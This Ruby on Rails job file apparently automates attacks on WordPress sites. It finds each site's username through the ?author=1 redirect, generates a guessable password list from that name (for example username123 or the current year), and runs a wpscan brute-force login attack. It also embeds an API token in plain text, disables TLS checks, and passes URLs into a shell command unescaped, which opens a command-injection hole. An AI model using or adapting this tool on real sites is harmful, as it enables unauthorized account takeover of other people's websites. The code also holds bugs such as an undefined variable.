# encoding: utf-8
require 'uri'
require 'cgi'
require 'fileutils'

class RunWpscanJob < ApplicationJob
  queue_as :default

  API_TOKEN = 'JyrztKLFjKYaAmPX6cUoFX2AWquTqZxaNBtacVPwjUo'
  def perform server
    site_url = "#{server.protocal}://#{server.name}"
    Rails.logger.info "== checking: #{site_url}"

    # 1. 尝试出对方的author,  例如 http://target.com?author=1 ， 看一下 是否会变成 https://target.com/author/021loan
    # 是的话，那么 021loan 就是用户名
    # 如果url 没有变化，那么就检测 response body中，是否存在：
    username = get_username site_url

    result_json_file = File.join(Rails.root, "tmp", "wpscan_for_#{server.name}.json")
    command = get_command url: "#{server.protocal}://#{server.name}", username: username, result_json_file: result_json_file

    result = `#{command}`
    # Scan Aborted: The URL supplied redirects to https://www.zzzsj.cn/. Use the --ignore-main-redirect option to ignore the redirection and scan the target, or change the --url option value to the redirected URL.
    wpscan_url = site_url
    if result.include?('The URL supplied redirects to')
      new_url = result.match(/The URL supplied redirects to ([http|https]:\/\/[^\s]+)/)[1]
      Rails.logger.info "=== redirecting to new website: #{new_domain}"
      command = get_command url: new_url, username: username, result_json_file: result_json_file
      wpscan_url = new_url
      result = `#{command}`
    end

    Rails.logger.info "== result: #{result}"
    Rails.logger.info `ls tmp -al`
    sleep 1
    server.update wpscan_usernames: username, wpscan_result: File.read(result_json_file), wpscan_url: wpscan_url
  end

  def get_command options
    username = options[:username]
    command = "wpscan --url #{options[:url]} --api-token #{API_TOKEN} --random-user-agent --no-update --disable-tls-checks --connect-timeout 5 --request-timeout 5  --no-banner --format=json --output=#{options[:result_json_file]}"

    if username.present?
      # 2. 生成对应的密码字典  保存为临时密码文件  tmp/password_for_#{username}.txt
      # 密码模板见 files/password_template.txt
      password_file = generate_password_dictionary(username)
      command = "#{command} --usernames #{username} --passwords #{password_file} "
    end
    command += " 2>&1"
    Rails.logger.info "== in get_command, command: #{command} "
    return command
  end

  def get_username site_url
    Rails.logger.info "== getting username"
    author_url = "#{site_url}?author=1"

    begin
      response = HTTParty.get(author_url,
        headers: { 'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
        timeout: 10
      )
    rescue Exception => e
      Rails.logger.warn e
      Rails.logger.warn e.backtrace.join("\r")
      Rails.logger.warn "-- site is down"
      return nil
    end

    Rails.logger.info "-- reponse.code: #{response.code}"

    username = nil
    # 检查是否有重定向
    if response.headers['location']
      Rails.logger.info "-- case1 in location"
      # 从重定向URL中提取用户名
      redirect_url = response.headers['location']
      if redirect_url.match(/\/author\/([^\/\?]+)/)
        username = $1
        # 处理可能的URL编码问题，确保正确解码中文字符
        username = URI.decode_www_form_component(username) rescue username
        Rails.logger.info  "Found username from redirect: #{username} for #{site_url}"
      end
    else
      Rails.logger.info "-- case2 in location"
      # 检查响应体中的HTML标签
      body = response.body.force_encoding('UTF-8')
      # TODO 在response body 中寻找这个 "https://zzz.pet/author/ice"  可以认为， http...zzz.pt  这个是域名， ice是我们想要的东西。
      match_result = body.match(/\/author\/([a-zA-Z0-9]+)/)
      Rails.logger.info "--- match_result: #{match_result.inspect}"
      username = $1
    end
    Rails.logger.info "--- username: #{username}"
    return username
  end

  def generate_password_dictionary(username)
    # 确保用户名使用UTF-8编码
    username = username.force_encoding('UTF-8') if username.is_a?(String)

    # 生成密码文件路径，对文件名中的特殊字符进行处理
    filename = "password_for_#{username}.txt"
    # 处理可能的文件名中的特殊字符
    filename = filename.gsub(/[<>:"\/\\|?*\x00-\x1F]/, '_')
    password_file = File.join(Rails.root, "tmp", filename)

    # 创建tmp目录（如果不存在）
    FileUtils.mkdir_p(File.join(Rails.root, "tmp"))

    # 读取密码模板
    template_file = File.join(Rails.root, 'files', 'password_template.txt')

    passwords = []
    if File.exist?(template_file)
      # 读取模板并替换用户名占位符
      File.readlines(template_file, encoding: 'UTF-8').each do |line|
        line = line.strip
        # 替换用户名占位符
        line = line.gsub('%username%', username)
        passwords << line unless line.empty?
      end
    else
      # 如果模板文件不存在，使用默认密码列表
      passwords = [
        username,
        "#{username}123",
        "#{username}123456",
        "#{username}@123",
        "#{username}666",
        "#{username}666666",
        "#{username}888",
        "#{username}!!!",
        "#{username}!@#",
        "#{username}@@@",
        "#{username}###",
        "#{username}888888",
        "#{username}#{Time.now.year}",
        "#{username}_#{Time.now.year}",
      ]
    end

    # 写入密码文件，使用UTF-8编码
    File.open(password_file, 'w', encoding: 'UTF-8') do |file|
      passwords.each { |password| file.puts password }
    end

    return password_file
  end
end
